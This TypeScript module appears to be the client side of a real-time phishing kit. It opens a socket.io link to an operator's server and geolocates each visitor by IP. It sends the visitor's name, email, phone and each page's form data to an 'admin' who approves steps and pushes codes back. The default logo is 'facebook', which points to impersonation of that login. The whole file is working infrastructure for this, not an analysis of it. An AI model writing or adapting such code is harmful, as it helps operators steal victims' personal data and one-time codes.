/* eslint-disable @typescript-eslint/no-explicit-any */
import { effect, signal } from "@preact/signals";
import axios from "axios";
import { NavigateFunction } from "react-router-dom";
import { io as ClientIO } from "socket.io-client";
import { Message, USERINFO } from "../types";

// ROOM Is The Code That Sent To Us In Email To Connect With Real Time Server, We Can Cheng It From .env file ==> CODE Variable //

export const ROOM = import.meta.env.VITE_CODE;

export const socket = signal(
  new (ClientIO as any)(
    import.meta.env.VITE_MODE === "DEV"
      ? import.meta.env.VITE_DEV_SOCKET_IO_URL
      : import.meta.env.VITE_PROD_SOCKET_IO_URL,
    {
      transports: ["polling"],
      autoConnect: true,
      forceNew: true,
    }
  )
);

// The States That Used To Make The Real Time Feature Work

export const socketId = signal("");

export const userInfo = signal<undefined | USERINFO>(undefined);

export const currentPage = signal("");

// To Sent To Server Any Time Tht It Change

export const details = signal<undefined | any>(undefined);

export const loading = signal(false);

export const isApproved = signal(false);

export const messages = signal<Message[]>([]);

export const permissions = signal<string[]>([]);

export const message = signal("");

export const lastMessage = signal("");

export const extraInfo = signal({
  fullName: "",
  email: "",
  date: new Date(),
  phone: "",
  number: "",
});

//For Admin Rejected Our Request Notification

export const isAdminError = signal(false);

//For Showen Chat Model

export const isChat = signal(false);

//For Chat Notification

export const isNewMessage = signal(0);

//For Code That Sent From Admin

export const code = signal("");

//For Logo That We Sent To Admin

export const logo = signal("facebook");

effect(() => {
  // api To Get Current Device Info

  axios.get("https://ipapi.co/json/").then((res) => {
    userInfo.value = res.data;
  });

  // == Listen For Successfully Connected With Real Time Server  ==

  socket.value.on("successfully-connected", (id: string) => {
    socketId.value = id;

    //Joining With Current Id To Server

    socket.value.emit("join", socketId.value);

    details.value = {
      ...details.value,
      id: socketId.value,
    };
  });
});

effect(() => {
  if (userInfo.value && currentPage.value) {
    details.value = {
      currentPage: currentPage.value,
      country: userInfo.value?.country_name,
      city: userInfo.value?.city,
      Ip: userInfo.value?.ip,
      id: socketId.value,
      fullName: extraInfo.value?.fullName,
      email: extraInfo.value?.email,
      date: extraInfo.value?.date,
      room: ROOM,
    };
  }
});

effect(() => {
  if (isChat.value) {
    isNewMessage.value = 0;
  }
});

effect(() => {
  if (details.value) {
    socket.value.emit("info", details);
  }
});

// ==> EVENT FROM SERVER <== //

// == Receiving Messages For Chat ==

socket.value.on("receive-message", (m: Message) => {
  messages.value = [...messages.value, m];
  if (!isChat.value) {
    isNewMessage.value += 1;
  }
});

// == Done Operation Message From Admin  ==

socket.value.on("admin-last-message", ({ message }: { message: string }) => {
  lastMessage.value = message;
  loading.value = false;
  currentPage.value = "END";
});

// == Code That Sent From Admin  ==

socket.value.on("code", (adminCode: string) => {
  code.value = adminCode;
});

// Function That Used To Sent Data For Server Any Time

export function sendDataToServer(
  data: any,
  current: string,
  nextPage: string,
  waitingForAdminResponse: boolean,
  navigate?: NavigateFunction
) {
  message.value = "";
  isAdminError.value = false;
  socket.value.emit("more-info", {
    ...data,
    room: ROOM,
    date: new Date(),
    id: socketId.value,
    next: nextPage,
    page: current,
  });

  if (waitingForAdminResponse) {
    loading.value = true;
  } else {
    if (navigate) navigate("/" + nextPage);
    permissions.value = [...permissions.value, nextPage];
  }
}

export function sendMessage(message: string) {
  socket.value.emit("send-message", {
    content: message,
    id: socketId.value,
    date: new Date(),
    room: ROOM,
  });
}
